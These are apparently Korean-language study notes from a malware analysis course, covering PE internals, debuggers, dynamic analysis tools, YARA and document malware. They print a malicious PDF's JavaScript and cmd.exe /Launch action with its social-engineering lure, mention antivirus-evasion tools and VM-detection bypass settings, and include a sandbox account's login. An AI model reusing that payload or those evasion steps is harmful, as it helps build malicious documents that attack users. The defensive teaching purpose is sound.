# Malware Analysis

### 컴파일시 나오는 .obj 파일이란?
* 코드 -> 전처리 -> 컴파일러 -> 어셈플러 -> 링커 -> 실행파일
	- 컴파일과정
* obj
	- PE
	- ELF(Executable and Linkable Format)
	- COFF
* __헤더와 섹션에 대한 정보가 담김__

### stub 코드
* 컴파일러가 보호기법(Mitigation)을 적용하기 위해, '전처리' 과정에 앞에 붙이는 코드
	- 컴파일러 마다 stub 코드가 다름
* zip파일 같은 패킹(packing)하는데 사용
	- 안티리버싱
* 컴파일러의 컴파일 방식이 들어감
#### 참고
* https://blue-shadow.tistory.com/20

#### Immunity Debugger
* 파이썬 개발
* 64bit 지원

#### 레지스터, 레지스트리
* 레지스터 : CPU 임시저장공간
* 레지스트리 : 저장소

### Jst-in-time debugging - OllyDbg
* error가 났을떼 처리 하는 옵션
* 컴퓨터에서 에러가 나연 OllyDbg에서 처리
	- Make OllyDbg Jst-in-time debugging 활성
	
### Debugging otions - OllyDbg
* Events - Entry point of main module 선택

#### ASLR : Address Space Layout Randomization
* 메모리 보호기법

---
#### CPU가 다르면 레지스터 정보도 바뀜

#### 안드로이드는 힙메모리 영역만 사용
* 스택 영역은 시스템만?

#### 메모리에서 메모리는 복사가 안됨 - 프로그램이 그렇게 됨
* 복사가 되면 메모리 복사

---
```
CF => Carry Flag
OF => Overflow Flag
SF => Sign Flag
ZF => Zero Flag
AF => Auximiliary carry Flag
PF => Parity Flag
DF => Direction Flag
IF => Interrupt Flag
TF => Trap Flag

CF => 부호없는 수 끼리 연산 후 연산결과가 길면 1
OF => 부호있는 수 끼리 연산 후 연산결과가 길면 1
SF => 연산결과가 음수면 1
ZF => 연산결과가 0이면 1
AF => 10진수 연산시 보정(자리올림, 빌림 등)이 필요하면 1
PF => 연산결과에서 1이 짝수개이면 1
DF => 문자열 처리할때 사용하는데 0이면 전진하면서 처리, 1이면 빽하면서 처리함
IF => 인터럽트 처리할때 사용하는데 0이면 외부에서들어오는 인터럽트 무시, 1이면 허용함
TP => 프로세서 처리할때 사용하는데 0이면 디폴트고 1이면 명령 실행후 특정 프로시저 호출

출처: https://mu1ti.tistory.com/16 [Multi]
```

### jump에서 'short'의 의미
* 참고 : https://stackoverflow.com/questions/5757866/what-does-short-jump-mean-in-assembly-language

---
## 함수 호출 규약
1. __cdecl
*  호출자가 최종 스택 프레임 반환 작업을 함(
	- caller가 스택 정리
* 장점 : 가변 길이 인자 전달 유용
* 표시 방식 : -

2. __stdcall
* 최종 스택 프레임 반환 작업을 피호출자가 함
	- Callee:호출을 받은 함수
* 장점 : 코드길이가 짧아짐
* 표시 방식 : -

3. __fastcall
* parameter들중 처음 2개 까지만 레지스터(ecx, edx)에 저장하고, 나머지는 스택에 푸쉬함
	- 스택 프레임 반환 작업은 피호출자(Callee)가 한다.
* 장점 : 빠른 함수 호출
* 표시 방식 : @

#### __cdecl과 __stcall은 언제 사용되어질까?
* __cdecl 호출 규약은 가변적인 인수의 개수를 위한 스택 연산이 가능
	- printf 등 C컴파일러에서 많이 사용함 
*가변 인자를 갖는 함수의 구현은 RET 명령어에서의 상수 인코딩시 스택 정리를 그에 맞게 변화 시키지 못하기 때문에 스택 정리의 책임을 호출하는 측에 맡기는 것이라고 함

---
`공유폴더 -> 문법별 샘플 코드`
* 파일들이 컴파일이 안 되면, example.zip 파일 사용
* 스튜디오 2019 실행 -> 새 프로젝트 만들기 -> 콘솔 앱(같은 디렉터리에 저장 체크)
	- 디버거는 'Release'로 실행하자
* 프로젝트 탭 -> 속성 ->
	- 고급 - 문자집합(유니코드 문자 집합 사용)
		+ 멀티바이트 : ASKII
	- 링커 -> 고급 - 임의 기준 주소(ASLR)(아니오), DEP(아니오)
		+ 위의 파일을 '아니오'하면 보안에 취약해짐
	- 링커 -> 매니페스트 파일 - UAC 사용(아니오)
		+ UAC를 우회하는 코드는 악성코드일 확률이 높음
	- C/C++ -> 최적화 - 최적화(사용 안 함)
		+ 최적화로 코드가 바껴 분석이 힘듬
	- C/C++ -> 코드 생성 - 런타밍 라이브러리(다중 스레드 DLL/MD), 보안 검사(보안 검사 사용 안 함)
		+ DLL를 사용하면 컴파일을할 때 내 프로그램에 포함하지 않음
		+ 스택가드(Stackguard), 카나리(canary)
		
* if.txt파일읗 컴파일해서 분석
 - 소스코드와 어셈블리 코드와 비교
 - 다른 '.txt' 파일도 비교

* 분석 샘플 코드 1풀기
	- Star_게임.iso.zip 숙제(시리얼 우회)

#### 뮤텍스(mutex)와 세마포어(semaphore)란?
* 참고 : https://artwook.tistory.com/17
* 뮤탄트(Mutant)는 상호 배제로 사용(일반 사용자, 커널 레벨에서 사용)
	- 뮤텍스는 커널 레벨

#### Pocess Explorer 다운로드
* 참고 : http://sysinternals.com/
	- process Utilitles -> Pocess Explorer

## 잡담 - 보안 솔루션 발달 과정
* binary signature > 패턴 매칭 > H-IDS == Anti Virus
	- IDS : 패턴 매칭(지속적인 패턴 업데이트) + 분석 방식(엔진이 좋음)
	
* DLP > C/S 구조 : agent -> server > 취합후 모니터링
	- 너무 많은 데이터를 취합(망작)

* SIEM > 응용프로그램 동작 -> 이벤트 발생을 추적 > 모니터링
	- SIEM(보안 정보 및 이벤트 관리)

* EDR > 응용프로그램 동작 -> 이벤트 발생 > __판단을 자동화 처리__ <-- ML, SSDeep(함수 유사도 평가)
	- 얼마나 신뢰할 수 있는가?
	- 대상
		+ 네트워크 패킷
		+ 바이너리
		+ 이벤트 로그에 따른 이상탐지
		
### Windows Mitigation
* 보안 기능을 사용하여 위협을 완화(Mitigation)

--- 
### relocation 되는 파일을 안되게 수정 가능
* DLLCharacteristics 제거
* SECTION .reloc 제거 (.relocation)


### VA, RVA, RAW
* RVA : Relative Virtual Address
* VA : 메모리에 매핑된 절대 주소
	- VA = RVA + ImageBase
* RAW : 디스크(disk) 상에 file에서의 주소
	- offset
	- RAW - PointerToRawData = RVA - VirtualAddress
	- RAW = RVA - VirtualAddress + PointerToRawData
	
* VirtualAddress : offset을 찾을려하는 RVA가 속해있는 section의 RVA
	- section들의 RVA
* PointerToRawData : Offset을 찾으려는 RVA가 속해있는 section의 offset

## 배열
* 같은 자료형을 가지는 일련의(연속성의) 메모리 포인터

### 코딩, 리버싱 관계
* C -> 컴파일 <-- 리버싱
	- 패킹 -> 리버싱 난이도 급상승
	
* JAVA -> JVM - java bit code 프로그램 실행
	- JVM이 컴파일(?)/실행해줌

* APK -> java -> dalvik vm -> dex
	- 리버싱 : DEV -> JAR -> JAVA

### 숙제
* pefile 모듈을 이용해서, 섹션정보, IAT, INT 정보를 출력해보자
* 

---
### 브라우저에서 작동하는 언어(?)
* html, css, cookie, xml, javascript(js), java, applet, .swf(flash), cache control
	- Drive by download 공격 : 내부에서 다운로드 요청하는 씩으로 작동
	
## 프로그램의 동작 과정
* PPIS 부모프로세스 -> fork() - PID, Memory -> Page IN
	- DLL, handle(Mutex, Mutant, KEY(registry), 소켓, 디렉터리, 파일)
	- Event Log(create process, create thread, create socket)
	- 소켓 오픈시 -> port -> service -> process


### 프로그램 동적 분석 도구
* process explorer
	- PPID, PID, strings, DLL, handle 확인
* process monitor
	- 필터링 기능이 있어서 프로그램을 실행하기 전에 registry, 파일 등의 정보를 프로그램 실행 시 필터링 해서 필요한 부분만 용이하게 분석할 수 있게 도움을 줌
* tcpview
	- 소켓 오픈시 -> port -> service -> process
	- shvchost 같은 프로세스는 보통 DLL통해 서비스가 되는 건데, 실제 동작 시키는 정보를 보기위해서 process explorer랑 같이 사용해야 함
* autoruns
	- registry 라는 것은 응용프로그램의 databacse 인데, autoruns는 그 registry 목록 중 부팅 시 자동으로 시작 할 수 있는 registry 정보만 따로 보여줌
	- 즉 malware의 persistent기능을 체크해 볼 수 있음


#### port -> service -> process
* cmd > netstat -ano | findstr :포트번호 <== 열린 포트 번호와 관련된 PID
* TCPVIEW.exe

* process explorer를 이용해서 PID를 확인 후 그 PID의 dll정보와 handle정보를 확인
* listener socket를 오픈 하였을때 * 들어오는 연결을 박기 위해 대기중
	- 소켓이 어디에서나 연결할 준비가 되었음을 의미
	- 이렇게 있다가 호스트 이름, ip주소가 표기되면 해당 연결만 허용

#### sysanalyzer
* 동적 분석 자동화 도구
* 참고 : http://sandsprite.com/iDef/SysAnalyzer


### VMware를 진짜 머신으로 착각하게 만듦
```
isolation.tools.getPtrLocation.disable = "TRUE"
isolation.tools.setPtrLocation.disable = "TRUE"
isolation.tools.setVersion.disable = "TRUE"
isolation.tools.getVersion.disable = "TRUE"
monitor_control.disable_directexec = "TRUE"
monitor_control.disable_chksimd = "TRUE"
monitor_control.disable_ntreloc = "TRUE"
monitor_control.disable_selfmod = "TRUE"
monitor_control.disable_reloc = "TRUE"
monitor_control.disable_btinout = "TRUE"
monitor_control.disable_btmemspace = "TRUE"
monitor_control.disable_btpriv = "TRUE"
monitor_control.disable_btseg = "TRUE"
```
* 가상화 판단을 무력화

---
### dll 실행 방법
* rundll32.exe <dll파일명.dll> <함수명>

#### dll도 따로 실행할 수 있기 때문에
* __dll도 같이 분석해야함 !!!__


### MS 포맷 문제
* .lnk
	- lnk format	-> 응용프로그램과의 매핑
	- aaaa -> bbbb
	- aaaa -> cccc 임의의 프로그램을 실행 할 수 있음
	

* 확장자 => 고유 포맷을 가짐 => 전 운영체제 버전에 포맷기반 취약점이 나올 시 문제점이 발생
	- 아래 내용과 같이 변화하고 있음
* 확장자 부분이 응용
	- 확장자는 ==> 응용프로그램 마다 다르게 사용 => 하지만 포맷은 xml포맷으로 사용
	- xml은 text파일 포맷에 의한 취약점은 xml의 값을 잘못 받아들여서, 그걸 실행 시 발행하는 문제 밖엔 없음
* 그 결과 현재 윈도우 시스템 악성코드들이 점자 drive 레벨의 악성코드로 어려워지고 있다.
	- 보호하고 분석하는 난이도가 점차 커널 레벨 단계로 올라가고 있다.

* windows 10 creator 업데이트 이후로는 보안 프로그램들도 응용프로그램 레벨에서 보호 기술을 사용하면 악성 프로그램으로 간주
	- 랜섬웨어 탐지 솔류션 중(초기버전) ==> 더미 파일을 모니터링해서 파일을 건드리면 관련 프로세그를 트래킹해서 죽이는 방식을 많이 사용
	
	- windows system 운영체제는 message를 통해 간트롤이 되는 형태인데, 이 메시지를 후킹하면 더미 파일을 쉽게 모니터링 할 수 있음
	- 그런데 위 업데이트 이후 단순 API hooking으로는 모두 악성코드 취급을 받게되어서 랜섬웨어 탐지 솔루션들이 점차 커널 레벨 모니터링 타밎 기술을 사용하게 되었다.

### 숙제
* 내가 원하는 파일 분석.
	- 다운로드 하는 과정을 되도록이면 wireshark로 pcap 파일을 생성해 주세요.
	- 아는 만큼만 분석한 문서를 만들어 오세요
	
---
### app.any.run
* test@cozaco.men / SAiki

## What is Frida?
* 개발자, 리버스 엔지니어 및 연구원을 위한 동적 툴
	- 실시간 프로세스 디버그
	- 다른 프로세스 내에서 고유한 디버그 스크립트 실행 가능
	- 스크립트 가능
	- Porable
	- Open Source
	- Battle-tested
* 안드로이드(Android), iOS에서 많이 사용

### Basic Frida Skills
* 프로세스에 연결
* 함수 후킹
* 함수 인수 수정
* 함수 호출
* 메모리 검사
* 메모리 수정

## Yara란?
* Yara : 문자열이나 바이너리 패턴을 기반으로 악성코드를 검색하며 이러한 악성코드를 분류할 수 있게 하는 도구
	- 출처: https://kali-km.tistory.com/entry/Yara를-사용해보자

### 필터링하는 기준, 요소
* signature base
	- HASH
	- 문자열
	- 장점 : 패킹여부와 상관이 없다.
	- 단점 : 같은 파일로 다양한 signature 생산하는 현재 상황에서는 정확도가 매우 낮다.

* yara
	- signature base + raw 스트림 데이터를 추출을 통한 바이너리의 새로운 관점의 필터 방법
	- 장점 : signature base의 단점인 패턴 부분과 상관없이 프로그램의 code 부분에 대한 새로운 signature를 만들어 필터링하기 때문에 signature가 달라도 탐지 가능
	- 단점 : 기준없이 하나의 binary에서 만들 수 있는 yara rule은 대략 300 ~ 500 정도 된다. 즉, 필터링하기 위한 기준을 만들어서 적용하기 위해서는 binary에 대한 분석이 동반되어야 한다. 이 과정을 자동화 하기가 난이도가 높다. 또 하나의 단점은 패킹된 binary는 정적인 상태에서 추출해서 분석하기가 어렵다.

* 함수유사도 + ML
	- ssdeep fuzzy hash를 이용한 데이터 + 통계
	- 장점 : signature base가 가진 현계를 넘어 패턴없는 부분도 유사도를 통해 판단할 수 있다.
	- 단점 : 함수유사도를 통해 판단할 수 있는 부분의 정확도를 높이는 것이 어렵다.
	
* 리소스 + ML
	- MS 방석
	- 인텔리전스적인 분석 방법을 ML의 data set 추줄 방법에 접목시켜서 신뢰도를 높이는 방식
	
---
### 서비스 실행 및 관리 과정
* winlogon.exe (GINA) -> service.exe(SCM 관리자)을 실행하여 서비스를 관리함
* 예외적으로 DLL 기반의 서비스는 svchost에 위해서 관리됨  

### IMAGE_BASE_RELOCATION
* .relocaltion section

---
### 디버거 종류
* Ghidra

## IDA 단축키
* 스페이스바 : 그래픽 오버뷰
* 컨트로 + P : 점프 함수(함수 이동)
* G : 특정 어드래스로 이동(주소 이동)
* 컨트롤 + L : 이름으로 점프(이름 검색)
* 쉬프트 + F12 : 텍스트 출력
* Ctrl + F2 : 디버거 종료
* 쉬프트 + / : 계산기
* ctrl + x : 특정 함수가 어떤 함수로 부터 몇번 호출됬는지 확인 가능 (p : call, r : read)
	- XREF 검색
* 코드 수정 : alt + F2
*text 검색 : alt + t
* Quick view : ctrl + 1

### 자세한 정보는 아래를 참조
* '11 악성코드 분석\01-DOCS\분석 샘플\IDA 활용\IDA 연습 1.txt'

---
### 모바일 리버싱/점검
* 네이티브 앱 
	- 앱 자체에 데이터베이스를 가지고 설치된 데이터만으로 앱이 동작
	- 앱 분석시 앱을 디컴파일해서 코드와 저장되는 데이터 및 LOG를 분석
* 웹 앱
	- 브라우저 점검 시 입력값 검증이나 XSS 같은 점검을 하고 또 web proxy 방식을 활용한 데이터 정보 수집 및 변조 스킬을 가지고 있어야 한다.
	- 그리고 HTTPS 닽은 통신할 경우 인증서 부분 설정 법도 이해애햐 한다.
* 하이브리드 앱
	- 
	
---
* 포트 스캔 -> port -> service -> process
	- 응용프로그램의 header 정보가 나오면 그 정보를 통해 각 응용프로그램의 버전 정보를 알수 있음
	- 버전 정보가 나오면 그 버전별 알려진 취약점 리스트를 확보할 수 있고, 그걸 통해 exploit을 진행
* 취약점 정보 제공처	
	- CVE : https://www.cvedetails.com
	- CWE
	- MS : https://www.beyondtrust.com/resource/whitepapers/microsoft-vulnerability-report
	- exploit: https://www.exploit-db.com/
	
	
## Metasploit Framework
* 공격의 목록화 공격의 자동화 리스너를 제공함
* opensource -> backtrack 환경에서 기본으로 제공 -> kali -> rapid7

### armitage
* 스캔부터 exploit까지 한번에 자동화하여 공격하는 공격 자동화 환경

#### cobalt strike
* armitage 만들던 사람이 제작
* 스캔부터 exploit까지 한번에 자동화하여 공격하는 공격 자동화 환경
* 유로 버전이고 일부 온라인에서 크랙되어 있는 부분이 있지만, 설치 난이도가 높다.

### 실제 취약점 제보 흐름
* 응용프로그램 분석 : furzzing, 리버싱, EXPLOIT 제작 -> 취약점 제보

## 사회 공학적 기법
* XSS framework BeEf
	- http://beefproject.com/
	- 커스텀 통해 metasploit 붙일 수 있음
* SET framework
	- 피싱 사이트 만들기, 허니팟 수성, QR 코드
	
## 바이너리 변환
* exe2hex 
	- 포맷 변환 도구( 바이너리 포맷 변환, bat, powershell)
* shellter
	- https://www.shellterproject.com/download
	- 바이너리 난독화 도구
* exe -> bat, powershell
* exe -> shellter(ant virus = 백신 우회) -> exe2hex	

---
* 문서파일은 중요한 정보가 담긴 파일 일수 있기 때문에 되도록이면 직접 업로드를 하는 것보다는 hash값을 통해 체크하는 것을 권장

## pdfid 사용
* pdfid /var/www/html/test.pdf
```
PDFiD 0.2.7 /var/www/html/test.pdf
 PDF Header: %PDF-1.0
 obj                   12
 endobj                12
 stream                 2
 endstream              2
 xref                   2
 trailer                2
 startxref              2
 /Page                  2
 /Encrypt               0
 /ObjStm                0
 /JS                    1	# 일반적으로 문서에는 안 쓰임
 /JavaScript            1	# 일반적으로 문서에는 안 쓰임
 /AA                    1
 /OpenAction            1
 /AcroForm              0
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                1
 /EmbeddedFile          0
 /XFA                   0
 /Colors > 2^24         0
```
## pdf-parser 사용
* pdf-parser --stats /var/www/html/test.pdf
```
Comment: 3
XREF: 2
Trailer: 2
StartXref: 2
Indirect object: 12
  4: 4, 5, 6, 8
 /Action 2: 9, 10
 /Catalog 2: 1, 1
 /Filespec 1: 7
 /Page 2: 3, 3
 /Pages 1: 2
Search keywords:
 /JS 1: 9
 /JavaScript 1: 9
 /AA 1: 3
 /OpenAction 1: 1
 /Launch 1: 10
```
* pdf-parser --search javascript --raw /var/www/html/test.pdf
```
obj 9 0
 Type: /Action
 Referencing: 
<</S/JavaScript/JS(this.exportDataObject({ cName: "template", nLaunch: 0 });)/Type/Action>>

  <<
    /S /JavaScript
    /JS (this.exportDataObject({ cName: "template", nLaunch: 0 });)
    /Type /Action
  >>
```
* pdf-parser --object 10 --raw --filter /var/www/html/test.pdf
```
obj 10 0
 Type: /Action
 Referencing: 
<</S/Launch/Type/Action/Win<</F(cmd.exe)/D(c:\\windows\\system32)/P(/Q /C %HOMEDRIVE%&cd %HOMEPATH%&(if exist "Desktop\\template.pdf" (cd "Desktop"))&(if exist "My Documents\\template.pdf" (cd "My Documents"))&(if exist "Documents\\template.pdf" (cd "Documents"))&(if exist "Escritorio\\template.pdf" (cd "Escritorio"))&(if exist "Mis Documentos\\template.pdf" (cd "Mis Documentos"))&(start template.pdf)

To view the encrypted content please tick the "Do not show this message again" box and press Open.)>>>>

  <<
    /S /Launch
    /Type /Action
    /Win
      <<
        /F (cmd.exe)
        /D '(c:\\\\windows\\\\system32)'
        /P (
        /Q '/C %HOMEDRIVE%&cd %HOMEPATH%&(if exist "Desktop\\\\template.pdf" (cd "Desktop"))&(if exist "My Documents\\\\template.pdf" (cd "My Documents"))&(if exist "Documents\\\\template.pdf" (cd "Documents"))&(if exist "Escritorio\\\\template.pdf" (cd "Escritorio"))&(if exist "Mis Documentos\\\\template.pdf" (cd "Mis Documentos"))&(start template.pdf)\n\n\n\n\n\n\n\n\n\nTo view the encrypted content please tick the "Do not show this message again" box and press Open.)'
      >>
  >>

<</S/Launch/Type/Action/Win<</F(cmd.exe)/D(c:\\windows\\system32)/P(/Q /C %HOMEDRIVE%&cd %HOMEPATH%&(if exist "Desktop\\template.pdf" (cd "Desktop"))&(if exist "My Documents\\template.pdf" (cd "My Documents"))&(if exist "Documents\\template.pdf" (cd "Documents"))&(if exist "Escritorio\\template.pdf" (cd "Escritorio"))&(if exist "Mis Documentos\\template.pdf" (cd "Mis Documentos"))&(start template.pdf)

To view the encrypted content please tick the "Do not show this message again" box and press Open.)>>>>
```

## OLE 파일 포맷
* 폴더 역할의 스토리지(Storage)와 파일 역할의 스트림(Stream)으로 구성
	- 참고 : https://bonggang.tistory.com/136

* OLE 파일(CFB, Compound File Binary) 포맷은 일반적으로 복합 문서를 지칭하며 MS의 문서 포맷으로 사용된다.
* 폴더 역할의 스토리지(Storage)와 파일 역할의 스트림(Stream)으로 구성되어 있으며 512byte의 섹터 단위로 저장되어있다.

###  1. MACRO를 이용한 공격
참조 : AI_security\11 악성코드 분석\01-DOCS\문서 악성코드\WORD 문서 악성 코드.txt

#### 디핑 툴
* binary diffing
* DarunGrim

### 숙제
1. MACRO
	- macro 동작 코드가 VBscript로 되어 있어서, 관련 시그니처를 쉽게 스캔할 수 있음
2. OLE HTA 공격
	- Object Linking and Embedding
	- 링크(공격코드는 없고, 공격모드가 있는 곳으로 링크 설정)
3. OLE DDE 공격
	- Dynamic Data Exchange
	- 데이터를 한 응용 프로그램에서 다른 응용 프로그램으로 가져 오지 않지만 서로 참조
	- 윈도우 응용 프로그램 간의 동일한 데이터를 공유하도록 허용하는 방법 중 하나
	- 이 기능은 다른 프로세스를 실행시킬 수 있어 이 기능을 악용하여 악성코드를 다운 받거나 실행시키도록 한다.
* office OLE 포맷에 존재하는 취약점

---
* XSS보다 SQL이 방어가 쉽다.

